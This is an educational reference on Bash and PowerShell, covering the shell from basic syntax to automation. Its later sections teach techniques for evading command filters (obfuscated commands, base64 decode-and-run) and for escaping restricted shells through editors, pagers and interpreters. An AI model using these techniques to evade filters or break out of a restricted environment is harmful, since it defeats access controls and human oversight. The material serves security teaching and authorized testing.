# Advanced Shell & Bash

> **⚠️ AUTHORIZED USE ONLY.** This material is for education and authorized security testing. The restriction-bypass and restricted-shell-escape techniques in the later sections interact directly with target systems and are for use only on systems you own or are explicitly authorized to test. Using them to circumvent controls on systems you do not own is unauthorized access and a criminal offence in most jurisdictions. See the [Legal and Terms of Use](/legal) page.

> `Get comfortable in the terminal. The faster you do, the faster everything else in security makes sense.`

> **Scope:** A deep reference for the shell across Linux and Windows: what a shell is, how Bash and PowerShell work internally, Bash basics and advanced features, writing and running scripts, CMD versus PowerShell, cross-platform PowerShell, automation, and the offensive techniques for operating under command restrictions.

---

## Table of Contents
- [Core Concepts](#core-concepts)
- [What a Shell Is](#what-a-shell-is)
- [How Bash and PowerShell Work](#how-bash-and-powershell-work)
- [Bash Basics](#bash-basics)
- [Redirection and Pipes](#redirection-and-pipes)
- [Shell Expansions](#shell-expansions)
- [Advanced Bash Features](#advanced-bash-features)
- [Writing and Executing Scripts](#writing-and-executing-scripts)
- [Scripting Constructs](#scripting-constructs)
- [Test Operators](#test-operators)
- [CMD vs PowerShell](#cmd-vs-powershell)
- [PowerShell Fundamentals](#powershell-fundamentals)
- [Cross-Platform PowerShell](#cross-platform-powershell)
- [The Shell in Administration and Automation](#the-shell-in-administration-and-automation)
- [How Command Restrictions Are Built](#how-command-restrictions-are-built)
- [Bypassing Command Restrictions](#bypassing-command-restrictions)
- [Escaping Restricted Shells](#escaping-restricted-shells)
- [Command Reference](#command-reference)
- [Fast Recall](#fast-recall)
- [Resources](#resources)

## 1. Core Concepts

| Term | Meaning |
|------|---------|
| **Shell** | A program that interprets typed commands and passes them to the operating system |
| **Kernel** | The core of the OS that the shell talks to on your behalf |
| **Terminal** | The text interface (window or console) in which a shell runs |
| **Bash** | The Bourne Again Shell, the default shell on most Linux systems |
| **sh** | The POSIX shell, a smaller standard that Bash is a superset of |
| **CMD** | The legacy Windows command interpreter (Command Prompt) |
| **PowerShell** | Microsoft's object-oriented shell and scripting language |
| **Builtin** | A command implemented inside the shell itself (`cd`, `echo`) rather than a separate program |
| **Script** | A file of shell commands run as a program |
| **Environment variable** | A named value available to the shell and the programs it launches |
| **Restricted shell** | A locked-down shell (such as `rbash`) that blocks certain operations |

## 2. What a Shell Is

A shell is the layer between a human and the operating system kernel. You type a command, the shell interprets it, launches the right program or performs the action, and returns the result. It is both an **interactive command interpreter** and a **scripting language**.

**Why it matters, on both Linux and Windows:**

- It is the most direct and powerful way to control a system. Anything the graphical interface can do, the shell can usually do faster and scriptably.
- It is the foundation of **automation**: repetitive tasks become a script run once.
- It is essential in **security work**. Remote access to a compromised or administered system is almost always a shell, servers frequently have no GUI at all, and the shell is where reconnaissance, administration, and incident response actually happen.
- Understanding the shell deeply is what lets you operate when tools are missing, restricted, or filtered.

**The relationship:**

```text
User  →  Shell  →  Kernel  →  Hardware
        (interprets   (manages
         commands)     resources)
```

On Linux the dominant shell is **Bash**. On Windows there are two: the legacy **CMD** and the modern **PowerShell**. Learning the shell is not optional in security; it is the environment in which most of the work is done.

## 3. How Bash and PowerShell Work

The two shells share a purpose but differ fundamentally in what flows through them.

### Bash: a text stream

Bash processes a command line in stages: it reads the input, splits it into words (tokens), performs a defined sequence of **expansions** (Section 6), then executes the result, connecting programs through **streams of text**. Everything Bash passes between commands is plain text, which is why tools like `grep`, `sed`, and `awk` exist to slice and reshape that text.

```text
Read line → tokenize → expand → execute → text output → next command
```

### PowerShell: an object pipeline

PowerShell passes **structured objects**, not text. When one command's output flows to the next, it carries typed properties and methods, not lines of characters. `Get-Process` does not emit text to be parsed; it emits process objects with properties like `Name`, `Id`, and `CPU` that the next command can use directly.

```text
Get-Process | Where-Object CPU -gt 100 | Select-Object Name, Id
```

**The core difference:** in Bash you parse text to extract a value; in PowerShell you access a property on an object. This is the single most important distinction between the two worlds. Bash's text model is simple and universal; PowerShell's object model is more powerful for structured data but specific to its ecosystem.

## 4. Bash Basics

### Navigation and files

```bash
pwd                 # print working directory
cd /path            # change directory
cd ~                # home directory
cd -                # previous directory
ls -la              # list all, long format
cp src dst          # copy
mv src dst          # move or rename
rm file             # remove
rm -rf dir          # remove directory recursively (careful)
mkdir -p a/b/c      # create nested directories
touch file          # create empty file or update timestamp
find / -name "x"    # search for files
```

### Variables

```bash
name="value"        # assignment: no spaces around =
echo "$name"        # use: quote to be safe
export PATH="$PATH:/opt/bin"   # export to child processes
readonly x=5        # immutable
unset name          # remove
```

### Command basics

```bash
command1 ; command2         # run sequentially
command1 && command2        # run command2 only if command1 succeeded
command1 || command2        # run command2 only if command1 failed
command &                   # run in background
history                     # command history
!!                          # repeat last command
which ls                    # locate a command in PATH
type cd                     # what kind of command something is
```

### Quoting, which matters enormously

| Quoting | Effect |
|---------|--------|
| `"double"` | Expands variables and command substitution inside |
| `'single'` | Fully literal, nothing is expanded |
| `\` | Escapes the next single character |
| `` `...` `` or `$(...)` | Runs the enclosed command and substitutes its output |

The difference between `"$var"` and `'$var'` is the difference between the value and the literal text `$var`. Unquoted variables are also subject to word splitting and globbing, so quoting is a correctness issue, not just style.

## 5. Redirection and Pipes

Every process has three standard streams, identified by file descriptor numbers.

| Stream | FD | Purpose |
|--------|-----|---------|
| **stdin** | 0 | Input |
| **stdout** | 1 | Normal output |
| **stderr** | 2 | Error output |

### Redirection operators

```bash
command > file          # stdout to file (overwrite)
command >> file         # stdout to file (append)
command 2> file         # stderr to file
command 2>&1            # merge stderr into stdout
command &> file        # both stdout and stderr to file (bash)
command < file          # file as stdin
command << EOF          # here-document: inline multi-line input
command <<< "string"    # here-string: a single string as stdin
command 2>/dev/null     # discard errors
command > /dev/null 2>&1 # discard all output
```

### Pipes

A pipe connects one command's stdout to the next command's stdin, which is the heart of the Unix philosophy of chaining small tools.

```bash
cat file | grep error | sort | uniq -c | sort -rn
ps aux | grep ssh
command | tee file      # send to both the screen and a file
```

**Order of the streams matters.** `2>&1 > file` and `> file 2>&1` do different things: redirection is evaluated left to right, so the second form (redirect stdout to the file, then point stderr at wherever stdout now goes) is the one that captures both in the file.

## 6. Shell Expansions

Before Bash runs a command, it rewrites the line through a fixed sequence of expansions. Understanding this order is what makes the advanced and offensive techniques comprehensible, since they all exploit it.

**The order Bash performs expansions:**

1. **Brace expansion:** `{a,b,c}` and `{1..5}`
2. **Tilde expansion:** `~` becomes the home directory
3. **Parameter and variable expansion:** `$var`, `${var}`
4. **Command substitution:** `$(cmd)` and `` `cmd` ``
5. **Arithmetic expansion:** `$(( 2 + 2 ))`
6. **Word splitting:** the result is split on the characters in `IFS` (space, tab, newline by default)
7. **Filename expansion (globbing):** `*`, `?`, `[...]` are matched against filenames

```bash
echo {1..5}                 # 1 2 3 4 5
echo file{a,b,c}.txt        # filea.txt fileb.txt filec.txt
echo ~                      # /home/user
echo $((6 * 7))             # 42
echo *.txt                  # every .txt file in the directory
```

### Globbing (filename expansion)

| Pattern | Matches |
|---------|---------|
| `*` | Any string, including empty |
| `?` | Any single character |
| `[abc]` | One character from the set |
| `[a-z]` | One character in the range |
| `[!abc]` | One character not in the set |

Globbing matches against **existing filenames**, which is the key to several bypass techniques: `/bin/c?t` expands to `/bin/cat` if that file exists, without the letters `a` appearing literally in the command.

## 7. Advanced Bash Features

### Parameter expansion

Bash can transform a variable's value inline, without calling external tools.

| Form | Result |
|------|--------|
| `${var:-default}` | Value, or `default` if unset |
| `${var:=default}` | Value, assigning `default` if unset |
| `${var:?msg}` | Value, or error with `msg` if unset |
| `${var:+alt}` | `alt` if set, otherwise empty |
| `${#var}` | Length of the value |
| `${var#pattern}` | Remove shortest matching prefix |
| `${var##pattern}` | Remove longest matching prefix |
| `${var%pattern}` | Remove shortest matching suffix |
| `${var%%pattern}` | Remove longest matching suffix |
| `${var/find/replace}` | Replace first match |
| `${var//find/replace}` | Replace all matches |
| `${var:offset:length}` | Substring |
| `${var^^}` / `${var,,}` | Upper / lower case |

```bash
file="/path/to/archive.tar.gz"
echo "${file##*/}"      # archive.tar.gz  (basename)
echo "${file%/*}"       # /path/to        (dirname)
echo "${file%.*}"       # /path/to/archive.tar  (strip last extension)
```

### Command and process substitution

```bash
now=$(date +%F)             # command substitution: capture output
files=`ls`                  # older backtick form
diff <(sort a) <(sort b)    # process substitution: treat output as a file
```

### Arrays

```bash
arr=(one two three)
echo "${arr[0]}"            # one
echo "${arr[@]}"           # all elements
echo "${#arr[@]}"          # count
arr+=(four)                 # append
declare -A map              # associative array (dictionary)
map[key]="value"
```

### Functions and arithmetic

```bash
greet() { echo "Hello, $1"; }
greet world

result=$(( (3 + 4) * 2 ))
(( count++ ))
```

## 8. Writing and Executing Scripts

### The shebang

A script's first line names the interpreter that runs it.

```bash
#!/bin/bash
# a comment
echo "Hello, $USER"
```

`#!/bin/bash` forces Bash. `#!/usr/bin/env bash` finds Bash via `PATH`, which is more portable across systems where Bash lives in different locations.

### Making a script executable and running it

```bash
chmod +x script.sh      # add execute permission
./script.sh             # run it (needs the path)
bash script.sh          # run with bash explicitly (no execute bit needed)
source script.sh        # run in the current shell (keeps its variables)
. script.sh             # same as source
```

The difference between `./script.sh` and `source script.sh` matters: the first runs in a **subshell**, so variables it sets vanish afterward; `source` runs in the **current shell**, so its changes persist. That is why environment setup scripts are sourced.

### Arguments and special variables

| Variable | Meaning |
|----------|---------|
| `$0` | The script's name |
| `$1`, `$2`, ... | Positional arguments |
| `$#` | Number of arguments |
| `$@` | All arguments, as separate words |
| `$*` | All arguments, as one string |
| `$?` | Exit status of the last command |
| `$$` | The current process ID |
| `$!` | PID of the last background command |

### Exit codes

Every command returns a status: **0 means success**, any non-zero value means failure. Scripts use this to make decisions and should return their own status with `exit`.

```bash
if command; then echo "ok"; else echo "failed with $?"; fi
exit 0      # signal success
```

### Safer scripting

```bash
set -e          # exit on any command failure
set -u          # error on use of an unset variable
set -o pipefail # a pipeline fails if any stage fails
set -euo pipefail   # the common combination
```

## 9. Scripting Constructs

### Conditionals

```bash
if [[ $x -gt 10 ]]; then
    echo "big"
elif [[ $x -eq 10 ]]; then
    echo "ten"
else
    echo "small"
fi
```

### Loops

```bash
for i in 1 2 3; do echo "$i"; done
for f in *.txt; do echo "$f"; done
for ((i=0; i<5; i++)); do echo "$i"; done

while read -r line; do echo "$line"; done < file

until [[ $x -ge 10 ]]; do ((x++)); done
```

### Case

```bash
case "$1" in
    start) echo "starting" ;;
    stop)  echo "stopping" ;;
    *)     echo "usage: $0 {start|stop}" ;;
esac
```

Reading a file line by line with `while read` is a core pattern, and notably one way to display a file's contents without calling `cat`.

## 10. Test Operators

Conditions are evaluated with `[[ ... ]]` (the Bash keyword, preferred), `[ ... ]` (the older `test` command), or `test`.

### File tests

| Operator | True if |
|----------|---------|
| `-e file` | Exists |
| `-f file` | Is a regular file |
| `-d file` | Is a directory |
| `-r` / `-w` / `-x` | Readable / writable / executable |
| `-s file` | Exists and is not empty |
| `-L file` | Is a symbolic link |

### String tests

| Operator | True if |
|----------|---------|
| `-z str` | Empty |
| `-n str` | Not empty |
| `str1 = str2` | Equal |
| `str1 != str2` | Not equal |
| `str =~ regex` | Matches regex (in `[[ ]]`) |

### Numeric tests

| Operator | Meaning |
|----------|---------|
| `-eq` | Equal |
| `-ne` | Not equal |
| `-lt` / `-le` | Less than / less or equal |
| `-gt` / `-ge` | Greater than / greater or equal |

`[[ ]]` is safer than `[ ]` because it does not word-split or glob its operands, and it supports `&&`, `||`, and `=~` directly.

## 11. CMD vs PowerShell

Windows ships two shells. Knowing when each applies, and how they differ, is a core objective.

| | CMD (Command Prompt) | PowerShell |
|---|----------------------|------------|
| **Age and status** | Legacy, maintained for compatibility | Modern, actively developed |
| **Data model** | Text only | Structured objects |
| **Built on** | The old command interpreter | .NET |
| **Commands** | Small fixed set of built-ins | Thousands of cmdlets, extensible |
| **Scripting** | Batch files (`.bat`, `.cmd`) | Scripts (`.ps1`), a full language |
| **Piping** | Passes text | Passes objects |
| **Remote management** | Very limited | Built-in remoting |
| **Cross-platform** | Windows only | Runs on Windows, Linux, macOS |

### Common CMD commands and their PowerShell equivalents

| Task | CMD | PowerShell |
|------|-----|------------|
| List files | `dir` | `Get-ChildItem` (alias `dir`, `ls`) |
| Change directory | `cd` | `Set-Location` (alias `cd`) |
| Show file contents | `type` | `Get-Content` (alias `cat`, `type`) |
| Copy | `copy` | `Copy-Item` (alias `copy`) |
| Delete | `del` | `Remove-Item` (alias `del`, `rm`) |
| Clear screen | `cls` | `Clear-Host` (alias `cls`) |
| Network config | `ipconfig` | `Get-NetIPConfiguration` |
| List processes | `tasklist` | `Get-Process` (alias `ps`) |
| Kill process | `taskkill` | `Stop-Process` (alias `kill`) |

PowerShell keeps many CMD and Unix names as aliases, so `ls`, `cat`, and `cd` work, but they call object-based cmdlets underneath.

## 12. PowerShell Fundamentals

### Cmdlets follow Verb-Noun

Every native command is a **Verb-Noun** pair, which makes commands discoverable and consistent.

```powershell
Get-Process
Set-Location C:\
Get-ChildItem
Stop-Service -Name spooler
New-Item -ItemType File -Path test.txt
```

Common verbs: `Get`, `Set`, `New`, `Remove`, `Start`, `Stop`, `Add`. If you know the noun, you can usually guess the command.

### The object pipeline

```powershell
Get-Process | Where-Object { $_.CPU -gt 100 }     # filter
Get-Process | Sort-Object CPU -Descending          # sort
Get-Process | Select-Object Name, Id               # pick properties
Get-Service | Where-Object Status -eq "Running"    # filter on a property
Get-ChildItem | ForEach-Object { $_.Name }         # act on each object
```

`$_` (or `$PSItem`) is the current object in the pipeline. Because objects carry properties, you filter and sort on named fields rather than parsing text columns.

### Discovery: the three commands to know

```powershell
Get-Help Get-Process -Examples    # documentation
Get-Command *service*             # find commands
Get-Member                        # inspect an object's properties and methods
Get-Process | Get-Member          # what can I do with a process object?
```

`Get-Member` is the key to PowerShell: pipe anything into it to see exactly what properties and methods the objects have.

### Variables and execution policy

```powershell
$name = "value"
$procs = Get-Process
Get-ExecutionPolicy                          # scripts may be restricted by policy
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

Execution policy is a safety setting that controls whether scripts can run. It is a guardrail, not a security boundary, since it is easily and legitimately changed.

## 13. Cross-Platform PowerShell

Modern **PowerShell (version 7 and later)** is a separate product from the Windows-only **Windows PowerShell 5.1**. The distinction is worth knowing.

| | Windows PowerShell 5.1 | PowerShell 7+ |
|---|------------------------|---------------|
| **Availability** | Built into Windows, Windows only | Separate install, cross-platform |
| **Built on** | .NET Framework | .NET (Core) |
| **Platforms** | Windows | Windows, Linux, macOS |
| **Open source** | No | Yes |
| **Command** | `powershell` | `pwsh` |

On Linux and macOS, PowerShell 7 installs as `pwsh` and runs as a normal shell:

```bash
pwsh                        # start PowerShell on Linux or macOS
pwsh -Command "Get-Process" # run a command
pwsh ./script.ps1           # run a script
```

**Why this matters:** it means the same object-based scripting language and the same `.ps1` scripts can run across Windows, Linux, and macOS. For administrators and security professionals working in mixed environments, PowerShell 7 provides one consistent tool everywhere, rather than one shell for Windows and another for everything else. It coexists with Bash on Linux rather than replacing it.

## 14. The Shell in Administration and Automation

The shell's real power in professional work is **automation**: encoding a task once so it runs reliably and repeatedly, on demand or on a schedule.

### What gets automated

System administration and security work lean heavily on scripting for: backups, log collection and parsing, user and account management, software deployment, health checks, configuration enforcement, and incident response data-gathering. Anything done more than a few times is a candidate for a script.

### Scheduling on Linux: cron

`cron` runs commands on a schedule. Each line in a crontab has five time fields followed by the command.

```text
* * * * *  command
│ │ │ │ │
│ │ │ │ └─ day of week (0-6, Sunday = 0)
│ │ │ └─── month (1-12)
│ │ └───── day of month (1-31)
│ └─────── hour (0-23)
└───────── minute (0-59)
```

```bash
crontab -e              # edit your crontab
crontab -l              # list scheduled jobs
# run a backup script every day at 2:30 AM:
30 2 * * * /home/user/backup.sh
```

`systemd` timers are the modern alternative, offering more control and logging than cron.

### Scheduling on Windows

```powershell
# Task Scheduler via PowerShell, or the schtasks command in CMD
Get-ScheduledTask
schtasks /create /tn "Backup" /tr "C:\backup.ps1" /sc daily /st 02:30
```

### The automation mindset

The progression is: do it once by hand, then write a script that does it, then schedule the script so it runs without you. This is the same pattern behind configuration management and infrastructure automation at scale, and it is why shell fluency compounds in value over a career.

## 15. How Command Restrictions Are Built

Understanding restrictions from the defender's side is what reveals their gaps. Restrictions on command execution generally take one of a few forms.

| Mechanism | How it works | Typical weakness |
|-----------|--------------|------------------|
| **Blacklist / denylist** | Blocks specific command names or keywords (`cat`, `bash`, `;`) | Cannot block every equivalent; alternatives and obfuscation slip through |
| **Whitelist / allowlist** | Permits only an approved set of commands | Stronger, but an allowed command with a shell escape defeats it |
| **Restricted shell** | A locked shell (`rbash`) blocks `cd`, `/` in commands, redirection, and changing `PATH` | Allowed programs that can spawn a shell break out |
| **Input filtering** | A web app or WAF strips or rejects dangerous characters in injected input | Encoding and character substitution evade naive filters |
| **Character filters** | Block spaces, slashes, or specific symbols | The shell offers many ways to express the same thing without them |

**The core lesson:** a blacklist is a bet that the defender thought of every dangerous string, and the shell offers so many equivalent ways to express a command that the bet is very hard to win. This is precisely why allow-listing and true sandboxing are stronger than denylisting, and why finding the gap an author missed is often possible. The techniques that follow all exploit these weaknesses; the same knowledge tells a defender why their filter is insufficient.

## 16. Bypassing Command Restrictions

These techniques express a command in a form a naive filter does not recognize, exploiting the shell's expansions from Section 6. All are for authorized testing only.

### Quote and backslash insertion

The shell removes quotes and backslashes before execution, so inserting them changes the text without changing the command.

```bash
w'h'oami            # runs whoami
w"h"oami            # runs whoami
wh\oami             # runs whoami
c""at file          # runs cat file
/bin/c'a't file     # runs cat file
```

A filter searching for the literal string `whoami` or `cat` fails to match these.

### Globbing and wildcards

Because globs expand against existing filenames, a command name can be written without its literal letters.

```bash
/bin/c?t file       # ? matches any one char, resolves to /bin/cat
/bin/ca* file       # * matches, resolves to /bin/cat
/???/cat file       # /bin/cat via wildcard path
/bin/c[a]t file     # character class
/usr/bin/whoam?     # resolves to whoami
```

### Variable and parameter tricks

Empty or built-in variables can be spliced into a command name.

```bash
w${x}hoami          # x is unset and expands to nothing: whoami
who$@ami            # $@ is empty in this context: whoami
a=who; b=ami; $a$b  # concatenate from pieces
${PATH:0:1}         # yields "/" without typing a slash
```

### ANSI-C quoting and encoding

Bash's `$'...'` interprets escape sequences, letting you spell a command in hex or octal.

```bash
$'\x63\x61\x74' file        # \x63\x61\x74 is "cat"
$'\167\150\157\141\155\151' # octal for "whoami"
echo "d2hvYW1p" | base64 -d # decodes to whoami
echo "d2hvYW1p" | base64 -d | bash    # decode and run
```

### Getting spaces without a space

When spaces are filtered, several constructs substitute for them.

```bash
cat${IFS}file               # IFS contains a space by default
cat$IFS$9file               # $9 is empty, a common trick
{cat,file}                  # brace expansion produces "cat file"
cat<file                    # redirection instead of an argument
X=$'\x20'; cat${X}file      # a space built via ANSI-C quoting
```

### Alternatives when a command name is blocked

If one tool is on the blacklist, another does the same job. This is the single most useful habit.

| Blocked | Alternatives to read a file |
|---------|-----------------------------|
| `cat` | `tac`, `less`, `more`, `head`, `tail`, `nl`, `od`, `xxd`, `strings`, `base64 file`, `sort file`, `grep "" file`, `sed '' file`, `awk 1 file`, `mapfile < file`, `while read` |

| Blocked | Alternatives to list a directory |
|---------|----------------------------------|
| `ls` | `echo *`, `printf '%s\n' *`, `find .`, `dir`, `stat *` |

The mindset is what matters: a command is a means to an end, and the shell almost always offers another route to the same end.

## 17. Escaping Restricted Shells

A restricted shell (`rbash`, `rksh`, `rzsh`) blocks `cd`, output redirection, `/` in command names, and changing `PATH` or `SHELL`. The standard escape is to reach a full shell through a program the restricted shell still allows to run. For authorized testing only.

### Escape via programs that spawn a shell

Many everyday tools can launch a subshell, which inherits none of the restrictions.

```bash
# text editors
vi                          # then :set shell=/bin/bash and :shell, or :!/bin/bash
# pagers
less file                   # then type !/bin/bash
man man                     # then !/bin/bash
# programming languages
python3 -c 'import pty; pty.spawn("/bin/bash")'
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'
awk 'BEGIN {system("/bin/bash")}'
# find
find . -exec /bin/bash \; -quit
# other
env /bin/bash
```

The reference catalog of programs and their shell-escape one-liners is **GTFOBins**, which lists exactly which flags turn a given binary into a shell, a file read, or a privilege escalation.

### Escape via the connection itself

```bash
ssh user@host -t "/bin/bash --noprofile"    # request bash directly over ssh
ssh user@host -t "bash --norc"
```

### Working around PATH and slash restrictions

Once in a fuller shell, restrictions on `PATH` and `/` can often be undone.

```bash
export PATH=/bin:/usr/bin:$PATH   # restore a usable PATH
# copy allowed binaries into a writable directory on PATH,
# or invoke interpreters by their allowed names
```

**The pattern behind all of it:** a restricted shell controls the shell you are in, but not the programs it lets you run. Any allowed program that can execute another command or spawn a shell is an exit. This is also the defensive lesson: a restricted shell is only as tight as its allow-list of runnable programs, and editors, pagers, and interpreters must be excluded for it to hold.

## 18. Command Reference

### Essential Bash commands

| Category | Commands |
|----------|----------|
| **Navigation** | `pwd`, `cd`, `ls`, `pushd`, `popd` |
| **Files** | `cp`, `mv`, `rm`, `mkdir`, `touch`, `ln`, `find`, `locate`, `stat` |
| **Viewing text** | `cat`, `less`, `more`, `head`, `tail`, `nl` |
| **Processing text** | `grep`, `sed`, `awk`, `cut`, `sort`, `uniq`, `wc`, `tr`, `tee` |
| **Processes** | `ps`, `top`, `htop`, `kill`, `jobs`, `bg`, `fg`, `nohup`, `pgrep` |
| **Permissions** | `chmod`, `chown`, `umask`, `sudo` |
| **System** | `df`, `du`, `free`, `uname`, `uptime`, `env`, `export` |
| **Network** | `curl`, `wget`, `ssh`, `scp`, `nc`, `ss` |

### Shell operators

| Operator | Meaning |
|----------|---------|
| `;` | Sequence |
| `&&` | And (run next on success) |
| `\|\|` | Or (run next on failure) |
| `\|` | Pipe stdout to stdin |
| `&` | Background |
| `>` `>>` | Redirect stdout (overwrite / append) |
| `<` | Redirect stdin |
| `$(...)` | Command substitution |
| `$((...))` | Arithmetic |

### PowerShell essentials

| Task | Cmdlet |
|------|--------|
| Find commands | `Get-Command` |
| Get help | `Get-Help` |
| Inspect an object | `Get-Member` |
| Filter | `Where-Object` |
| Sort | `Sort-Object` |
| Select properties | `Select-Object` |
| Loop over items | `ForEach-Object` |
| Read a file | `Get-Content` |
| Processes / services | `Get-Process`, `Get-Service` |

## 19. Fast Recall

- A **shell** interprets commands between the user and the kernel, and is both an interactive interpreter and a scripting language.
- **Bash streams text; PowerShell streams objects.** In Bash you parse text; in PowerShell you access properties.
- **Quoting:** `"double"` expands variables, `'single'` is literal, `\` escapes one character.
- **Streams:** stdin (0), stdout (1), stderr (2). `2>&1` merges stderr into stdout; `2>/dev/null` discards errors.
- **A pipe** connects one command's stdout to the next command's stdin.
- **Expansion order:** brace, tilde, parameter, command substitution, arithmetic, word splitting, globbing.
- **Globbing** matches existing filenames, which is why `/bin/c?t` can stand in for `/bin/cat`.
- **Parameter expansion** (`${var##*/}`, `${var%.*}`) transforms values without external tools.
- **Shebang** `#!/bin/bash` sets the interpreter. `./script` runs in a subshell; `source script` runs in the current shell.
- **Special variables:** `$0` name, `$1` first argument, `$#` count, `$@` all, `$?` exit status, `$$` PID.
- **Exit code 0 is success;** non-zero is failure. `set -euo pipefail` makes scripts safer.
- **`[[ ]]`** is the preferred test construct; it does not word-split and supports `=~`.
- **CMD is legacy and text-based; PowerShell is modern and object-based.** PowerShell cmdlets are Verb-Noun.
- **`Get-Member`** reveals an object's properties and methods, the key to PowerShell.
- **PowerShell 7 (`pwsh`) is cross-platform** and open source; Windows PowerShell 5.1 is Windows-only.
- **Automation** via cron on Linux (five time fields) and Task Scheduler on Windows is the shell's core professional value.
- **Blacklists are hard to make complete;** the shell offers many equivalent ways to write a command.
- **Bypass techniques** exploit expansions: quote insertion (`w'h'oami`), globbing (`/bin/c?t`), empty variables (`w${x}hoami`), encoding (`base64 -d`), and `${IFS}` for spaces.
- **When a command is blocked,** another tool usually does the same job (`cat` to `tac`, `nl`, `xxd`, `base64`).
- **Restricted shells** are escaped through allowed programs that spawn a shell (editors, pagers, interpreters, `find`). See GTFOBins.

## 20. Resources

**Bash and the shell**
- [The Linux Command Line (William Shotts)](https://linuxcommand.org/tlcl.php)
- [GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/bash.html)
- [Bash Guide for Beginners (TLDP)](https://tldp.org/LDP/Bash-Beginners-Guide/html/)
- [Greg's Wiki (BashFAQ and BashPitfalls)](https://mywiki.wooledge.org/BashGuide)
- [ShellCheck (script analysis)](https://www.shellcheck.net/)
- [explainshell (breaks down any command)](https://explainshell.com/)

**PowerShell**
- [Microsoft PowerShell Documentation](https://learn.microsoft.com/en-us/powershell/)
- [Install PowerShell on Linux](https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-linux)
- [PowerShell.org](https://powershell.org/)
- [Windows commands reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands)

**Operating under restrictions (authorized testing)**
- [GTFOBins (Unix binaries for shell escape and more)](https://gtfobins.github.io/)
- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
